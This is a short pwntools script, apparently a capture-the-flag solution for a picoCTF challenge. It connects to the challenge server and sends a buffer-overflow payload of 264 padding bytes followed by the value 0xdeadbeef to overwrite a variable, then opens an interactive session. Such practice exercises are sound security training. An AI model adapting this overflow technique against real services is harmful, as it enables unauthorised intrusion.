from pwn import *

r = remote('mars.picoctf.net', 31890)

r.recvuntil("see?")
payload = "A" * 264 + "\xef\xbe\xad\xde"
r.sendline(payload)
r.interactive()

